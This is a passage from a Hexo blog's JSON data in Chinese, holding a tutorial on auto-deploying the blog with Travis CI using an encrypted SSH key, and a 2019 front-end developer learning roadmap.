缓存\n    cache:\n      directories:\n        - node_modules\n\n    before_install:\n    - openssl aes-256-cbc -K $encrypted_eced380b421a_key -iv $encrypted_eced380b421a_iv\n      -in id_rsa.enc -out ~/.ssh/id_rsa -d\n    # 改变文件权限\n    - chmod 600 ~/.ssh/id_rsa \n    # 配置 ssh\n    - eval $(ssh-agent)\n    - ssh-add ~/.ssh/id_rsa\n    - cp .travis/ssh_config ~/.ssh/config\n    # 配置 git 替换为自己的信息\n    - git config --global user.name 'jovysun'\n    - git config --global user.email jovy_sun@163.com\n\n\n    # 安装依赖\n    install:\n    - npm install hexo-cli -g\n    - npm install\n\n    # 部署的命令\n    script:\n    - npm run deploy  # hexo clean && hexo g -d\n\n    ```\n8. 打开package.json文件添加hexo部署命令，示例如下：\n    ```json\n      \"scripts\": {\n        \"deploy\": \"hexo clean && hexo g -d\"\n      }\n    ```\n\n这样每次提交完代码，就会自动触发Travis CI的自动集成即自动部署。\n# 参考\nhttps://segmentfault.com/a/1190000004667156","slug":"2019-04-18-travis-hexo","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xf005uwovvoeghjx3i","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>此篇默认读者已经使用过hexo写过几篇博文，并且已经创建好SSH key。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>hexo写博客，为了多端同步我们会切个开发分支，每次写完都要提交代码，同时还得部署，文章多了，等待部署时间较长。能不能提交后自动部署呢？<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>Travis CI 是一个持续集成(Continuous integration，简称CI)的工具。它可以在公共的 Github 仓库上免费使用。</p>\n<ol>\n<li><a href=\"https://travis-ci.org\" target=\"_blank\" rel=\"noopener\">Travis CI</a>注册账号，可以github账号授权登录；</li>\n<li>根目录创建<code>travis.yml</code>和<code>.travis</code>文件夹；</li>\n<li><p>安装travis（macOS系统为例）并登录；</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> sudo gem install travis</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> travis login --auto</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>加密私钥</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> travis encrypt-file ~/.ssh/id_rsa --add</span></span><br></pre></td></tr></table></figure>\n<p> 会在当前目录生成<code>id_rsa.enc</code>文件，并且<code>.travis.yml</code>文件中自动生成如下代码：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">before_install:</span><br><span class=\"line\">- openssl aes-256-cbc -K $encrypted_830d3b21a25d_key -iv $encrypted_830d3b21a25d_iv</span><br><span class=\"line\">  -in ~/.ssh/id_rsa.enc -out ~/.ssh/id_rsa -d</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在<code>.travis</code>文件夹下创建ssh_config文件，并添加代码如下：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host github.com</span><br><span class=\"line\">    User git</span><br><span class=\"line\">    StrictHostKeyChecking no</span><br><span class=\"line\">    IdentityFile ~/.ssh/id_rsa</span><br><span class=\"line\">    IdentitiesOnly yes</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>进入Travis CI网站设置页面，打开我们要集成的库，示例如下：<br> <img src=\"/2019-04-18-travis-hexo/1.png\" alt=\"示例图\"></p>\n</li>\n<li><p>配置<code>.travis.yml</code>文件，示例如下：</p>\n <figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 配置语言及相应版本</span></span><br><span class=\"line\"><span class=\"attr\">language:</span> <span class=\"string\">node_js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">node_js:</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"10\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#项目所在分支</span></span><br><span class=\"line\"><span class=\"comment\"># branches:</span></span><br><span class=\"line\"><span class=\"comment\">#   only:</span></span><br><span class=\"line\"><span class=\"comment\">#   - master</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 缓存</span></span><br><span class=\"line\"><span class=\"attr\">cache:</span></span><br><span class=\"line\"><span class=\"attr\">  directories:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">node_modules</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">before_install:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">openssl</span> <span class=\"string\">aes-256-cbc</span> <span class=\"bullet\">-K</span> <span class=\"string\">$encrypted_eced380b421a_key</span> <span class=\"bullet\">-iv</span> <span class=\"string\">$encrypted_eced380b421a_iv</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span><span class=\"string\">in</span> <span class=\"string\">id_rsa.enc</span> <span class=\"bullet\">-out</span> <span class=\"string\">~/.ssh/id_rsa</span> <span class=\"bullet\">-d</span></span><br><span class=\"line\"><span class=\"comment\"># 改变文件权限</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">chmod</span> <span class=\"number\">600</span> <span class=\"string\">~/.ssh/id_rsa</span> </span><br><span class=\"line\"><span class=\"comment\"># 配置 ssh</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">eval</span> <span class=\"string\">$(ssh-agent)</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">ssh-add</span> <span class=\"string\">~/.ssh/id_rsa</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">cp</span> <span class=\"string\">.travis/ssh_config</span> <span class=\"string\">~/.ssh/config</span></span><br><span class=\"line\"><span class=\"comment\"># 配置 git 替换为自己的信息</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"bullet\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">'jovysun'</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"bullet\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">jovy_sun@163.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装依赖</span></span><br><span class=\"line\"><span class=\"attr\">install:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">hexo-cli</span> <span class=\"bullet\">-g</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">npm</span> <span class=\"string\">install</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 部署的命令</span></span><br><span class=\"line\"><span class=\"attr\">script:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">npm</span> <span class=\"string\">run</span> <span class=\"string\">deploy</span>  <span class=\"comment\"># hexo clean &amp;&amp; hexo g -d</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>打开package.json文件添加hexo部署命令，示例如下：</p>\n <figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"deploy\": \"hexo clean &amp;&amp; hexo g -d\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>这样每次提交完代码，就会自动触发Travis CI的自动集成即自动部署。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://segmentfault.com/a/1190000004667156\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000004667156</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>此篇默认读者已经使用过hexo写过几篇博文，并且已经创建好SSH key。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>hexo写博客，为了多端同步我们会切个开发分支，每次写完都要提交代码，同时还得部署，文章多了，等待部署时间较长。能不能提交后自动部署呢？<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>Travis CI 是一个持续集成(Continuous integration，简称CI)的工具。它可以在公共的 Github 仓库上免费使用。</p>\n<ol>\n<li><a href=\"https://travis-ci.org\" target=\"_blank\" rel=\"noopener\">Travis CI</a>注册账号，可以github账号授权登录；</li>\n<li>根目录创建<code>travis.yml</code>和<code>.travis</code>文件夹；</li>\n<li><p>安装travis（macOS系统为例）并登录；</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> sudo gem install travis</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> travis login --auto</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>加密私钥</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> travis encrypt-file ~/.ssh/id_rsa --add</span></span><br></pre></td></tr></table></figure>\n<p> 会在当前目录生成<code>id_rsa.enc</code>文件，并且<code>.travis.yml</code>文件中自动生成如下代码：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">before_install:</span><br><span class=\"line\">- openssl aes-256-cbc -K $encrypted_830d3b21a25d_key -iv $encrypted_830d3b21a25d_iv</span><br><span class=\"line\">  -in ~/.ssh/id_rsa.enc -out ~/.ssh/id_rsa -d</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在<code>.travis</code>文件夹下创建ssh_config文件，并添加代码如下：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host github.com</span><br><span class=\"line\">    User git</span><br><span class=\"line\">    StrictHostKeyChecking no</span><br><span class=\"line\">    IdentityFile ~/.ssh/id_rsa</span><br><span class=\"line\">    IdentitiesOnly yes</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>进入Travis CI网站设置页面，打开我们要集成的库，示例如下：<br> <img src=\"/2019-04-18-travis-hexo/1.png\" alt=\"示例图\"></p>\n</li>\n<li><p>配置<code>.travis.yml</code>文件，示例如下：</p>\n <figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 配置语言及相应版本</span></span><br><span class=\"line\"><span class=\"attr\">language:</span> <span class=\"string\">node_js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">node_js:</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"10\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#项目所在分支</span></span><br><span class=\"line\"><span class=\"comment\"># branches:</span></span><br><span class=\"line\"><span class=\"comment\">#   only:</span></span><br><span class=\"line\"><span class=\"comment\">#   - master</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 缓存</span></span><br><span class=\"line\"><span class=\"attr\">cache:</span></span><br><span class=\"line\"><span class=\"attr\">  directories:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">node_modules</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">before_install:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">openssl</span> <span class=\"string\">aes-256-cbc</span> <span class=\"bullet\">-K</span> <span class=\"string\">$encrypted_eced380b421a_key</span> <span class=\"bullet\">-iv</span> <span class=\"string\">$encrypted_eced380b421a_iv</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span><span class=\"string\">in</span> <span class=\"string\">id_rsa.enc</span> <span class=\"bullet\">-out</span> <span class=\"string\">~/.ssh/id_rsa</span> <span class=\"bullet\">-d</span></span><br><span class=\"line\"><span class=\"comment\"># 改变文件权限</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">chmod</span> <span class=\"number\">600</span> <span class=\"string\">~/.ssh/id_rsa</span> </span><br><span class=\"line\"><span class=\"comment\"># 配置 ssh</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">eval</span> <span class=\"string\">$(ssh-agent)</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">ssh-add</span> <span class=\"string\">~/.ssh/id_rsa</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">cp</span> <span class=\"string\">.travis/ssh_config</span> <span class=\"string\">~/.ssh/config</span></span><br><span class=\"line\"><span class=\"comment\"># 配置 git 替换为自己的信息</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"bullet\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">'jovysun'</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"bullet\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">jovy_sun@163.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装依赖</span></span><br><span class=\"line\"><span class=\"attr\">install:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">hexo-cli</span> <span class=\"bullet\">-g</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">npm</span> <span class=\"string\">install</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 部署的命令</span></span><br><span class=\"line\"><span class=\"attr\">script:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">npm</span> <span class=\"string\">run</span> <span class=\"string\">deploy</span>  <span class=\"comment\"># hexo clean &amp;&amp; hexo g -d</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>打开package.json文件添加hexo部署命令，示例如下：</p>\n <figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"deploy\": \"hexo clean &amp;&amp; hexo g -d\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>这样每次提交完代码，就会自动触发Travis CI的自动集成即自动部署。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://segmentfault.com/a/1190000004667156\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000004667156</a></p>"},{"title":"web前端知识图谱2019","date":"2019-04-23T08:17:53.000Z","updated":"2019-04-23T08:17:53.000Z","_content":"\n# 概述\n针对Web前端开发者，知识图谱分为通用部分和前端专有部分。该篇整理自给出的参考文档，主要作备忘及对照梳理自己的知识结构。\n<!-- more -->\n# 详述\n\n## 通用知识\n\n![通用知识图谱](1.jpg)\n\n1. Git\n最流行的版本控制系统之一。没有 Git 再也无法生存。\n\n2. SSH\n它允许你远程登录到另一台主机，这是另一个流行的、每个 Web 开发人员都应该知道的网络概念。\n\n3. HTTP/HTTPS\nHTTP 协议是 Web 的基础，对于 Web 开发人员来说，必须熟悉 HTTP 和 HTTPS。\n\n4. 终端的基本用法：Linux 命令行基础\n不仅仅是 Web 开发人员，对于任何程序员来说，Linux 命令行都是非常非常重要的，我强烈建议你花一些时间来学习它们。\n\n5. 数据结构和算法\n这是任何程序的构建块，更好地了解算法和数据结构是你在下一份工作或当前工作中做得更好的关键。\n\n6. 字符编码\n如果你正在创建全球应用程序，其中显示了世界上许多不同语言的信息，那么你应该精通字符编码。它本质上是告诉浏览器如何显示你的数据。\n\n7. GitHub\n毫无疑问，每个程序员都应该了解 Git 和 Github，因为它们是版本控制和代码库方面的标准。\n\n\n## 专有知识\n\n![专有知识](2.png)\n\n1. Web 开发基础\n显然，如果你想成为一名 Web 开发人员，那么你应该了解互联网、Web 应用程序、HTTP 之类的协议以及 Web 开发的基础知识。\n\n2. HTML 和 CSS\nHTML 和 CSS 是任何网站的基础。HTML 提供了结构，而 CSS 提供了样式，使它们看起来更好看，更具有视觉吸引力。如果你想成为一个真正的前端开发人员，那么你必须掌握这两方面的知识。\n\n3. JavaScript\n就像面向对象编程的四大支柱（抽象、封装、多态和继承）一样，Web 开发也有三大支柱，即 HTML、CSS 和 JavaScript。前两个提供了结构和样式，但正是 JavaScript 通过添加交互性使它们变得有生气。\n\n4. TypeScript\n就像我们有 C 和 C++ 一样，TypeScript 可以看成是 JavaScript++，尽管它不像 C++ 那么流行。TypeScript 的好处在于它在 JavaScript 代码中增加了类型安全，这意味着你可以在开发阶段捕获与 JavaScript 类型相关的错误。它还使得为 JavaScript 开发面向对象代码变得更容易。\n\n5. Angular\n人们使用纯 HTML、CSS 和 JavaScript 构建网站的日子已经一去不复返了。如今，大部分工作都是由 Angular、React JS 或 Vue.js 这样的框架完成的。它们不仅提供了存储代码的结构，而且使快速开发 Web 应用程序变得很容易。Angular 由谷歌支持，因此，学习 Angular 对于任何现代 Web 开发人员来说都是一个不错的选择。\n\n6. React JS\n与 Angular 类似，React 也是开发 Web 应用程序的一个流行库。它允许你编写可重用的组件，然后你可以使用这些组件创建现代风格的交互式 Web 页面。就像 Angular 由谷歌支持一样，React 也有 Facebook 支持，因此非常受欢迎。\n\n7. Vue.js\nVue 或 Vue JS 在去年真的加快了步伐，越来越多的人推荐和使用 Vue.js。我仍然是 Vue 的初学者，可能需要一些时间来学习并迁移到基于 Vue 的应用程序中。\n\n关于前端开发者应该学哪些内容，强烈推荐大家去读这篇文章，里面有非常详细的前端开发者学习指南：\nhttps://frontendmasters.com/books/front-end-handbook/2019/\n\n# 参考\nhttps://github.com/kamranahmedse/developer-roadmap\nhttps://mp.weixin.qq.com/s/mz3yoUvPc6R_4byA3wKCJw","source":"_posts/2019/04/2019-04-23-developer-roadmap-2019.md","raw":"---\ntitle: web前端知识图谱2019\ntags:\n  - HTML\n  - CSS\n  - JavaScript\n  - 备忘\ncategories:\n  - 前端\ndate: 2019-04-23 16:17:53\nupdated: 2019-04-23 16:17:53\n---\n\n# 概述\n针对Web前端开发者，知识图谱分为通用部分和前端专有部分。该篇整理自给出的参考文档，主要作备忘及对照梳理自己的知识结构。\n<!-- more -->\n# 详述\n\n## 通用知识\n\n![通用知识图谱](1.jpg)\n\n1. Git\n最流行的版本控制系统之一。没有 Git 再也无法生存。\n\n2. SSH\n它允许你远程登录到另一台主机，这是另一个流行的、每个 Web 开发人员都应该知道的网络概念。\n\n3. HTTP/HTTPS\nHTTP 协议是 Web 的基础，对于 Web 开发人员来说，必须熟悉 HTTP 和 HTTPS。\n\n4. 终端的基本用法：Linux 命令行基础\n不仅仅是 Web 开发人员，对于任何程序员来说，Linux 命令行都是非常非常重要的，我强烈建议你花一些时间来学习它们。\n\n5. 数据结构和算法\n这是任何程序的构建块，更好地了解算法和数据结构是你在下一份工作或当前工作中做得更好的关键。\n\n6. 字符编码\n如果你正在创建全球应用程序，其中显示了世界上许多不同语言的信息，那么你应该精通字符编码。它本质上是告诉浏览器如何显示你的数据。\n\n7. GitHub\n毫无疑问，每个程序员都应该了解 Git 和 Github，因为它们是版本控制和代码库方面的标准。\n\n\n## 专有知识\n\n![专有知识](2.png)\n\n1. Web 开发基础\n显然，如果你想成为一名 Web 开发人员，那么你应该了解互联网、Web 应用程序、HTTP 之类的协议以及 Web 开发的基础知识。\n\n2. HTML 和 CSS\nHTML 和 CSS 是任何网站的基础。HTML 提供了结构，而 CSS 提供了样式，使它们看起来更好看，更具有视觉吸引力。如果你想成为一个真正的前端开发人员，那么你必须掌握这两方面的知识。\n\n3. JavaScript\n就像面向对象编程的四大支柱（抽象、封装、多态和继承）一样，Web 开发也有三大支柱，即 HTML、CSS 和 JavaScript。前两个提供了结构和样式，但正是 JavaScript 通过添加交互性使它们变得有生气。\n\n4. TypeScript\n就像我们有 C 和 C++ 一样，TypeScript 可以看成是 JavaScript++，尽管它不像 C++ 那么流行。TypeScript 的好处在于它在 JavaScript 代码中增加了类型安全，这意味着你可以在开发阶段捕获与 JavaScript 类型相关的错误。它还使得为 JavaScript 开发面向对象代码变得更容易。\n\n5. Angular\n人们使用纯 HTML、CSS 和 JavaScript 构建网站的日子已经一去不复返了。如今，大部分工作都是由 Angular、React JS 或 Vue.js 这样的框架完成的。它们不仅提供了存储代码的结构，而且使快速开发 Web 应用程序变得很容易。Angular 由谷歌支持，因此，学习 Angular 对于任何现代 Web 开发人员来说都是一个不错的选择。\n\n6. React JS\n与 Angular 类似，React 也是开发 Web 应用程序的一个流行库。它允许你编写可重用的组件，然后你可以使用这些组件创建现代风格的交互式 Web 页面。就像 Angular 由谷歌支持一样，React 也有 Facebook 支持，因此非常受欢迎。\n\n7. Vue.js\nVue 或 Vue JS 在去年真的加快了步伐，越来越多的人推荐和使用 Vue.js。我仍然是 Vue 的初学者，可能需要一些时间来学习并迁移到基于 Vue 的应用程序中。\n\n关于前端开发者应该学哪些内容，强烈推荐大家去读这篇文章，里面有非常详细的前端开发者学习指南：\nhttps://frontendmasters.com/books/front-end-handbook/2019/\n\n# 参考\nhttps://github.com/kamranahmedse/developer-roadmap\nhttps://mp.weixin.qq.com/s/mz3yoUvPc6R_4byA3wKCJw","slug":"2019-04-23-developer-roadmap-2019","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xf005xwovvwj9swdvv","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>针对Web前端开发者，知识图谱分为通用部分和前端专有部分。该篇整理自给出的参考文档，主要作备忘及对照梳理自己的知识结构。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"通用知识\"><a href=\"#通用知识\" class=\"headerlink\" title=\"通用知识\"></a>通用知识</h2><p><img src=\"/2019-04-23-developer-roadmap-2019/1.jpg\" alt=\"通用知识图谱\"></p>\n<ol>\n<li><p>Git<br>最流行的版本控制系统之一。没有 Git 再也无法生存。</p>\n</li>\n<li><p>SSH<br>它允许你远程登录到另一台主机，这是另一个流行的、每个 Web 开发人员都应该知道的网络概念。</p>\n</li>\n<li><p>HTTP/HTTPS<br>HTTP 协议是 Web 的基础，对于 Web 开发人员来说，必须熟悉 HTTP 和 HTTPS。</p>\n</li>\n<li><p>终端的基本用法：Linux 命令行基础<br>不仅仅是 Web 开发人员，对于任何程序员来说，Linux 命令行都是非常非常重要的，我强烈建议你花一些时间来学习它们。</p>\n</li>\n<li><p>数据结构和算法<br>这是任何程序的构建块，更好地了解算法和数据结构是你在下一份工作或当前工作中做得更好的关键。</p>\n</li>\n<li><p>字符编码<br>如果你正在创建全球应用程序，其中显示了世界上许多不同语言的信息，那么你应该精通字符编码。它本质上是告诉浏览器如何显示你的数据。</p>\n</li>\n<li><p>GitHub<br>毫无疑问，每个程序员都应该了解 Git 和 Github，因为它们是版本控制和代码库方面的标准。</p>\n</li>\n</ol>\n<h2 id=\"专有知识\"><a href=\"#专有知识\" class=\"headerlink\" title=\"专有知识\"></a>专有知识</h2><p><img src=\"/2019-04-23-developer-roadmap-2019/2.png\" alt=\"专有知识\"></p>\n<ol>\n<li><p>Web 开发基础<br>显然，如果你想成为一名 Web 开发人员，那么你应该了解互联网、Web 应用程序、HTTP 之类的协议以及 Web 开发的基础知识。</p>\n</li>\n<li><p>HTML 和 CSS<br>HTML 和 CSS 是任何网站的基础。HTML 提供了结构，而 CSS 提供了样式，使它们看起来更好看，更具有视觉吸引力。如果你想成为一个真正的前端开发人员，那么你必须掌握这两方面的知识。</p>\n</li>\n<li><p>JavaScript<br>就像面向对象编程的四大支柱（抽象、封装、多态和继承）一样，Web 开发也有三大支柱，即 HTML、CSS 和 JavaScript。前两个提供了结构和样式，但正是 JavaScript 通过添加交互性使它们变得有生气。</p>\n</li>\n<li><p>TypeScript<br>就像我们有 C 和 C++ 一样，TypeScript 可以看成是 JavaScript++，尽管它不像 C++ 那么流行。TypeScript 的好处在于它在 JavaScript 代码中增加了类型安全，这意味着你可以在开发阶段捕获与 JavaScript 类型相关的错误。它还使得为 JavaScript 开发面向对象代码变得更容易。</p>\n</li>\n<li><p>Angular<br>人们使用纯 HTML、CSS 和 JavaScript 构建网站的日子已经一去不复返了。如今，大部分工作都是由 Angular、React JS 或 Vue.js 这样的框架完成的。它们不仅提供了存储代码的结构，而且使快速开发 Web 应用程序变得很容易。Angular 由谷歌支持，因此，学习 Angular 对于任何现代 Web 开发人员来说都是一个不错的选择。</p>\n</li>\n<li><p>React JS<br>与 Angular 类似，React 也是开发 Web 应用程序的一个流行库。它允许你编写可重用的组件，然后你可以使用这些组件创建现代风格的交互式 Web 页面。就像 Angular 由谷歌支持一样，React 也有 Facebook 支持，因此非常受欢迎。</p>\n</li>\n<li><p>Vue.js<br>Vue 或 Vue JS 在去年真的加快了步伐，越来越多的人推荐和使用 Vue.js。我仍然是 Vue 的初学者，可能需要一些时间来学习并迁移到基于 Vue 的应用程序中。</p>\n</li>\n</ol>\n<p>关于前端开发者应该学哪些内容，强烈推荐大家去读这篇文章，里面有非常详细的前端开发者学习指南：<br><a href=\"https://frontendmasters.com/books/front-end-handbook/2019/\" target=\"_blank\" rel=\"noopener\">https://frontendmasters.com/books/front-end-handbook/2019/</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://github.com/kamranahmedse/developer-roadmap\" target=\"_blank\" rel=\"noopener\">https://github.com/kamranahmedse/developer-roadmap</a><br><a href=\"https://mp.weixin.qq.com/s/mz3yoUvPc6R_4byA3wKCJw\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/mz3yoUvPc6R_4byA3wKCJw</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" 